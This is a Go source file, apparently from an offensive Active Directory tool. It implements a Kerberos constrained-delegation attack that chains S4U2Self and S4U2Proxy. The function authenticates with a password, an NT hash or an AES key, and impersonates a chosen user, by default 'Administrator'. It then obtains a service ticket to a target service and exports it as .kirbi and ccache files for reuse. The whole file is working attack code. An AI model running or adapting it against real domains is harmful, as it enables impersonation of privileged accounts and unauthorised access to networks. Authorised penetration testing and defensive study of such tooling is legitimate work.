package kerberos

import (
	"fmt"
	"os"
	"strings"

	mtkrb "github.com/TheManticoreProject/Manticore/network/kerberos/v5"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/messages"
)

// S4UResult describes a service ticket obtained through constrained delegation.
type S4UResult struct {
	Impersonated string
	TargetSPN    string
	KirbiPath    string
	CCachePath   string
}

// S4U performs the MS-SFU constrained-delegation flow (S4U2Self then S4U2Proxy)
// as the account in username/secret, obtaining a service ticket to targetSPN
// issued for the impersonated user, and writes it as a .kirbi and a ccache.
//
// The account must be allowed to delegate to the target (classic constrained
// delegation via msDS-AllowedToDelegateTo, or resource-based delegation granted
// on the target). realm is the AD DNS domain and kdcHost a domain controller.
// A secret is required: aesKey, then hash (RC4), then password.
func S4U(kdcHost, realm, username, password, hash, aesKey, impersonate, targetSPN, outBase string) (*S4UResult, error) {
	if impersonate == "" {
		impersonate = "Administrator"
	}
	realmUpper := strings.ToUpper(realm)

	client := mtkrb.NewClient(username, realmUpper, kdcHost)
	defer client.Destroy()

	switch {
	case aesKey != "":
		if err := client.WithAESKey(aesKey); err != nil {
			return nil, fmt.Errorf("aes-key: %w", err)
		}
	case hash != "":
		if err := client.WithNTHash(hash); err != nil {
			return nil, fmt.Errorf("hash: %w", err)
		}
	case password != "":
		client.WithPassword(password)
	default:
		return nil, fmt.Errorf("S4U requires a secret for %s (password, hash or AES key)", username)
	}

	if err := client.GetTGT(); err != nil {
		return nil, fmt.Errorf("GetTGT: %w", err)
	}

	_, selfRaw, _, _, err := client.S4U2Self(impersonate, realmUpper)
	if err != nil {
		return nil, fmt.Errorf("S4U2Self(%s): %w", impersonate, err)
	}

	ticket, proxyRaw, key, etype, err := client.S4U2Proxy(targetSPN, selfRaw)
	if err != nil {
		return nil, fmt.Errorf("S4U2Proxy(%s): %w", targetSPN, err)
	}

	// Rebuild the delegated service ticket so it can be exported, using the
	// session-key encryption type reported by the KDC in the S4U2Proxy TGS-REP.
	st := &mtkrb.ServiceTicket{
		Ticket:       ticket,
		TicketRaw:    proxyRaw,
		SessionKey:   key,
		SessionEType: etype,
		Client:       messages.PrincipalName{NameType: messages.NameTypePrincipal, NameString: []string{impersonate}},
		CRealm:       realmUpper,
		SName:        ticket.SName,
		SRealm:       ticket.Realm,
	}
	if err := client.LoadServiceTicket(st); err != nil {
		return nil, fmt.Errorf("load delegated ticket: %w", err)
	}

	res := &S4UResult{Impersonated: impersonate, TargetSPN: targetSPN}

	kirbiPath := outBase + "_s4u.kirbi"
	if err := client.ExportServiceTicketKirbiToFile(targetSPN, kirbiPath); err != nil {
		return nil, fmt.Errorf("export kirbi: %w", err)
	}
	res.KirbiPath = kirbiPath

	ccachePath := outBase + "_s4u.ccache"
	if client.ExportServiceTicketCCacheToFile(targetSPN, ccachePath) == nil {
		res.CCachePath = ccachePath
	} else {
		_ = os.Remove(ccachePath)
	}
	return res, nil
}
